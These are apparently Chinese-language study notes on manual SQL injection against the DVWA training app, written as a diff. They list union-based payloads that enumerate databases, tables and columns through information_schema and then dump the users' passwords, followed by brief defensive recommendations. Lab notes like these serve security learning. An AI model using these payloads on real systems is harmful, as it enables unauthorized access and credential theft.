@@ -1,0 +1,22 @@
+1. 飘点 测试 ‘ || “
+2. 1' or 1=1 # 
+
+Mysql
+
+总结：
+1.每个项目应该按照实际情况建立相应的用户（保护其他库同时保护information_schema）
+2.输入框应该限制输入长度
+3.mysql可以建议提供系统两个库（information_schema，mysql）的自定义名称及字段自定义名称
+
+1' order by 1... #  显示注入查看查询的字段数目以便后来的显示注入union使用
+1' union select 1,2 #
+1' union select database(), version() #   || user()
+1' union select 1,@@global.version_compile_os from mysql.user #  显示数据库存放的主机的系统
+
+1' union select (select group_concat(table_name) from information_schema.tables where table_schema= "dvwa" ),2 #
+显示dvwa的数据库有几张表分别是什么(guestbook,users)
+
+1' union select (select group_concat(column_name) from information_schema.columns where table_name= "users"),(select group_concat(column_name) from information_schema.columns where table_name= "guestbook") #
+根据爆出的数据表爆出表里的字段(users : user_id,first_name,last_name,user,password,avatar,last_login,failed_login, guestbook: comment_id,comment,name)
+
+1' union select user,password from users #  爆出数据
